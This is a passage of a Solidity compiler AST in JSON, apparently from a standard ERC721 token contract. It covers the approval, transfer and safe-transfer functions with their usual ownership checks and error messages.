(address)"}},"id":339,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"4282:12:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":340,"name":"operator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":331,"src":"4296:8:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":341,"name":"approved","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":333,"src":"4306:8:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_bool","typeString":"bool"}],"id":337,"name":"_setApprovalForAll","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":862,"src":"4263:18:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_bool_$returns$__$","typeString":"function (address,address,bool)"}},"id":342,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"4263:52:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":343,"nodeType":"ExpressionStatement","src":"4263:52:1"}]},"documentation":{"id":329,"nodeType":"StructuredDocumentation","src":"4108:56:1","text":" @dev See {IERC721-setApprovalForAll}."},"functionSelector":"a22cb465","id":345,"implemented":true,"kind":"function","modifiers":[],"name":"setApprovalForAll","nameLocation":"4178:17:1","nodeType":"FunctionDefinition","overrides":{"id":335,"nodeType":"OverrideSpecifier","overrides":[],"src":"4244:8:1"},"parameters":{"id":334,"nodeType":"ParameterList","parameters":[{"constant":false,"id":331,"mutability":"mutable","name":"operator","nameLocation":"4204:8:1","nodeType":"VariableDeclaration","scope":345,"src":"4196:16:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":330,"name":"address","nodeType":"ElementaryTypeName","src":"4196:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":333,"mutability":"mutable","name":"approved","nameLocation":"4219:8:1","nodeType":"VariableDeclaration","scope":345,"src":"4214:13:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":332,"name":"bool","nodeType":"ElementaryTypeName","src":"4214:4:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"4195:33:1"},"returnParameters":{"id":336,"nodeType":"ParameterList","parameters":[],"src":"4253:0:1"},"scope":998,"src":"4169:153:1","stateMutability":"nonpayable","virtual":true,"visibility":"public"},{"baseFunctions":[1113],"body":{"id":362,"nodeType":"Block","src":"4491:59:1","statements":[{"expression":{"baseExpression":{"baseExpression":{"id":356,"name":"_operatorApprovals","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":99,"src":"4508:18:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_address_$_t_bool_$_$","typeString":"mapping(address => mapping(address => bool))"}},"id":358,"indexExpression":{"id":357,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":348,"src":"4527:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"4508:25:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_bool_$","typeString":"mapping(address => bool)"}},"id":360,"indexExpression":{"id":359,"name":"operator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":350,"src":"4534:8:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"4508:35:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"functionReturnParameters":355,"id":361,"nodeType":"Return","src":"4501:42:1"}]},"documentation":{"id":346,"nodeType":"StructuredDocumentation","src":"4328:55:1","text":" @dev See {IERC721-isApprovedForAll}."},"functionSelector":"e985e9c5","id":363,"implemented":true,"kind":"function","modifiers":[],"name":"isApprovedForAll","nameLocation":"4397:16:1","nodeType":"FunctionDefinition","overrides":{"id":352,"nodeType":"OverrideSpecifier","overrides":[],"src":"4467:8:1"},"parameters":{"id":351,"nodeType":"ParameterList","parameters":[{"constant":false,"id":348,"mutability":"mutable","name":"owner","nameLocation":"4422:5:1","nodeType":"VariableDeclaration","scope":363,"src":"4414:13:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":347,"name":"address","nodeType":"ElementaryTypeName","src":"4414:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":350,"mutability":"mutable","name":"operator","nameLocation":"4437:8:1","nodeType":"VariableDeclaration","scope":363,"src":"4429:16:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":349,"name":"address","nodeType":"ElementaryTypeName","src":"4429:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"4413:33:1"},"returnParameters":{"id":355,"nodeType":"ParameterList","parameters":[{"constant":false,"id":354,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":363,"src":"4485:4:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":353,"name":"bool","nodeType":"ElementaryTypeName","src":"4485:4:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"4484:6:1"},"scope":998,"src":"4388:162:1","stateMutability":"view","virtual":true,"visibility":"public"},{"baseFunctions":[1079],"body":{"id":389,"nodeType":"Block","src":"4731:207:1","statements":[{"expression":{"arguments":[{"arguments":[{"arguments":[],"expression":{"argumentTypes":[],"id":376,"name":"_msgSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1501,"src":"4820:10:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns (address)"}},"id":377,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"4820:12:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":378,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":370,"src":"4834:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":375,"name":"_isApprovedOrOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":533,"src":"4801:18:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_address_$_t_uint256_$returns$_t_bool_$","typeString":"function (address,uint256) view returns (bool)"}},"id":379,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"4801:41:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a2063616c6c6572206973206e6f7420746f6b656e206f776e6572206f7220617070726f766564","id":380,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"4844:47:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af","typeString":"literal_string \"ERC721: caller is not token owner or approved\""},"value":"ERC721: caller is not token owner or approved"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af","typeString":"literal_string \"ERC721: caller is not token owner or approved\""}],"id":374,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"4793:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":381,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"4793:99:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":382,"nodeType":"ExpressionStatement","src":"4793:99:1"},{"expression":{"arguments":[{"id":384,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":366,"src":"4913:4:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":385,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":368,"src":"4919:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":386,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":370,"src":"4923:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":383,"name":"_transfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":806,"src":"4903:9:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":387,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"4903:28:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":388,"nodeType":"ExpressionStatement","src":"4903:28:1"}]},"documentation":{"id":364,"nodeType":"StructuredDocumentation","src":"4556:51:1","text":" @dev See {IERC721-transferFrom}."},"functionSelector":"23b872dd","id":390,"implemented":true,"kind":"function","modifiers":[],"name":"transferFrom","nameLocation":"4621:12:1","nodeType":"FunctionDefinition","overrides":{"id":372,"nodeType":"OverrideSpecifier","overrides":[],"src":"4722:8:1"},"parameters":{"id":371,"nodeType":"ParameterList","parameters":[{"constant":false,"id":366,"mutability":"mutable","name":"from","nameLocation":"4651:4:1","nodeType":"VariableDeclaration","scope":390,"src":"4643:12:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":365,"name":"address","nodeType":"ElementaryTypeName","src":"4643:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":368,"mutability":"mutable","name":"to","nameLocation":"4673:2:1","nodeType":"VariableDeclaration","scope":390,"src":"4665:10:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":367,"name":"address","nodeType":"ElementaryTypeName","src":"4665:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":370,"mutability":"mutable","name":"tokenId","nameLocation":"4693:7:1","nodeType":"VariableDeclaration","scope":390,"src":"4685:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":369,"name":"uint256","nodeType":"ElementaryTypeName","src":"4685:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4633:73:1"},"returnParameters":{"id":373,"nodeType":"ParameterList","parameters":[],"src":"4731:0:1"},"scope":998,"src":"4612:326:1","stateMutability":"nonpayable","virtual":true,"visibility":"public"},{"baseFunctions":[1069],"body":{"id":408,"nodeType":"Block","src":"5127:56:1","statements":[{"expression":{"arguments":[{"id":402,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":393,"src":"5154:4:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":403,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":395,"src":"5160:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":404,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":397,"src":"5164:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"hexValue":"","id":405,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"5173:2:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""},"value":""}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""}],"id":401,"name":"safeTransferFrom","nodeType":"Identifier","overloadedDeclarations":[409,439],"referencedDeclaration":439,"src":"5137:16:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_bytes_memory_ptr_$returns$__$","typeString":"function (address,address,uint256,bytes memory)"}},"id":406,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"5137:39:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":407,"nodeType":"ExpressionStatement","src":"5137:39:1"}]},"documentation":{"id":391,"nodeType":"StructuredDocumentation","src":"4944:55:1","text":" @dev See {IERC721-safeTransferFrom}."},"functionSelector":"42842e0e","id":409,"implemented":true,"kind":"function","modifiers":[],"name":"safeTransferFrom","nameLocation":"5013:16:1","nodeType":"FunctionDefinition","overrides":{"id":399,"nodeType":"OverrideSpecifier","overrides":[],"src":"5118:8:1"},"parameters":{"id":398,"nodeType":"ParameterList","parameters":[{"constant":false,"id":393,"mutability":"mutable","name":"from","nameLocation":"5047:4:1","nodeType":"VariableDeclaration","scope":409,"src":"5039:12:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":392,"name":"address","nodeType":"ElementaryTypeName","src":"5039:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":395,"mutability":"mutable","name":"to","nameLocation":"5069:2:1","nodeType":"VariableDeclaration","scope":409,"src":"5061:10:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":394,"name":"address","nodeType":"ElementaryTypeName","src":"5061:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":397,"mutability":"mutable","name":"tokenId","nameLocation":"5089:7:1","nodeType":"VariableDeclaration","scope":409,"src":"5081:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":396,"name":"uint256","nodeType":"ElementaryTypeName","src":"5081:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5029:73:1"},"returnParameters":{"id":400,"nodeType":"ParameterList","parameters":[],"src":"5127:0:1"},"scope":998,"src":"5004:179:1","stateMutability":"nonpayable","virtual":true,"visibility":"public"},{"baseFunctions":[1059],"body":{"id":438,"nodeType":"Block","src":"5399:164:1","statements":[{"expression":{"arguments":[{"arguments":[{"arguments":[],"expression":{"argumentTypes":[],"id":424,"name":"_msgSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1501,"src":"5436:10:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns (address)"}},"id":425,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"5436:12:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":426,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":416,"src":"5450:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":423,"name":"_isApprovedOrOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":533,"src":"5417:18:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_address_$_t_uint256_$returns$_t_bool_$","typeString":"function (address,uint256) view returns (bool)"}},"id":427,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"5417:41:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a2063616c6c6572206973206e6f7420746f6b656e206f776e6572206f7220617070726f766564","id":428,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"5460:47:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af","typeString":"literal_string \"ERC721: caller is not token owner or approved\""},"value":"ERC721: caller is not token owner or approved"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af","typeString":"literal_string \"ERC721: caller is not token owner or approved\""}],"id":422,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"5409:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":429,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"5409:99:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":430,"nodeType":"ExpressionStatement","src":"5409:99:1"},{"expression":{"arguments":[{"id":432,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":412,"src":"5532:4:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":433,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":414,"src":"5538:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":434,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":416,"src":"5542:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":435,"name":"data","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":418,"src":"5551:4:1","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":431,"name":"_safeTransfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":468,"src":"5518:13:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_bytes_memory_ptr_$returns$__$","typeString":"function (address,address,uint256,bytes memory)"}},"id":436,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"5518:38:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":437,"nodeType":"ExpressionStatement","src":"5518:38:1"}]},"documentation":{"id":410,"nodeType":"StructuredDocumentation","src":"5189:55:1","text":" @dev See {IERC721-safeTransferFrom}."},"functionSelector":"b88d4fde","id":439,"implemented":true,"kind":"function","modifiers":[],"name":"safeTransferFrom","nameLocation":"5258:16:1","nodeType":"FunctionDefinition","overrides":{"id":420,"nodeType":"OverrideSpecifier","overrides":[],"src":"5390:8:1"},"parameters":{"id":419,"nodeType":"ParameterList","parameters":[{"constant":false,"id":412,"mutability":"mutable","name":"from","nameLocation":"5292:4:1","nodeType":"VariableDeclaration","scope":439,"src":"5284:12:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":411,"name":"address","nodeType":"ElementaryTypeName","src":"5284:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":414,"mutability":"mutable","name":"to","nameLocation":"5314:2:1","nodeType":"VariableDeclaration","scope":439,"src":"5306:10:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":413,"name":"address","nodeType":"ElementaryTypeName","src":"5306:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":416,"mutability":"mutable","name":"tokenId","nameLocation":"5334:7:1","nodeType":"VariableDeclaration","scope":439,"src":"5326:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":415,"name":"uint256","nodeType":"ElementaryTypeName","src":"5326:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":418,"mutability":"mutable","name":"data","nameLocation":"5364:4:1","nodeType":"VariableDeclaration","scope":439,"src":"5351:17:1","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":417,"name":"bytes","nodeType":"ElementaryTypeName","src":"5351:5:1","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"5274:100:1"},"returnParameters":{"id":421,"nodeType":"ParameterList","parameters":[],"src":"5399:0:1"},"scope":998,"src":"5249:314:1","stateMutability":"nonpayable","virtual":true,"visibility":"public"},{"body":{"id":467,"nodeType":"Block","src":"6564:165:1","statements":[{"expression":{"arguments":[{"id":452,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":442,"src":"6584:4:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":453,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":444,"src":"6590:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":454,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":446,"src":"6594:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":451,"name":"_transfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":806,"src":"6574:9:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":455,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"6574:28:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":456,"nodeType":"ExpressionStatement","src":"6574:28:1"},{"expression":{"arguments":[{"arguments":[{"id":459,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":442,"src":"6643:4:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":460,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":444,"src":"6649:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":461,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":446,"src":"6653:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":462,"name":"data","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":448,"src":"6662:4:1","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":458,"name":"_checkOnERC721Received","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":938,"src":"6620:22:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_bytes_memory_ptr_$returns$_t_bool_$","typeString":"function (address,address,uint256,bytes memory) returns (bool)"}},"id":463,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"6620:47:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a207472616e7366657220746f206e6f6e20455243373231526563656976657220696d706c656d656e746572","id":464,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"6669:52:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e","typeString":"literal_string \"ERC721: transfer to non ERC721Receiver implementer\""},"value":"ERC721: transfer to non ERC721Receiver implementer"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e","typeString":"literal_string \"ERC721: transfer to non ERC721Receiver implementer\""}],"id":457,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"6612:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":465,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"6612:110:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":466,"nodeType":"ExpressionStatement","src":"6612:110:1"}]},"documentation":{"id":440,"nodeType":"StructuredDocumentation","src":"5569:850:1","text":" @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\n are aware of the ERC721 protocol to prevent tokens from being forever locked.\n `data` is additional data, it has no specified format and it is sent in call to `to`.\n This internal function is equivalent to {safeTransferFrom}, and can be used to e.g.\n implement alternative mechanisms to perform token transfer, such as signature-based.\n Requirements:\n - `from` cannot be the zero address.\n - `to` cannot be the zero address.\n - `tokenId` token must exist and be owned by `from`.\n - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n Emits a {Transfer} event."},"id":468,"implemented":true,"kind":"function","modifiers":[],"name":"_safeTransfer","nameLocation":"6433:13:1","nodeType":"FunctionDefinition","parameters":{"id":449,"nodeType":"ParameterList","parameters":[{"constant":false,"id":442,"mutability":"mutable","name":"from","nameLocation":"6464:4:1","nodeType":"VariableDeclaration","scope":468,"src":"6456:12:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":441,"name":"address","nodeType":"ElementaryTypeName","src":"6456:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":444,"mutability":"mutable","name":"to","nameLocation":"6486:2:1","nodeType":"VariableDeclaration","scope":468,"src":"6478:10:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":443,"name":"address","nodeType":"ElementaryTypeName","src":"6478:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":446,"mutability":"mutable","name":"tokenId","nameLocation":"6506:7:1","nodeType":"VariableDeclaration","scope":468,"src":"6498:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":445,"name":"uint256","nodeType":"ElementaryTypeName","src":"6498:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":448,"mutability":"mutable","name":"data","nameLocation":"6536:4:1","nodeType":"VariableDeclaration","scope":468,"src":"6523:17:1","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":447,"name":"bytes","nodeType":"ElementaryTypeName","src":"6523:5:1","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr"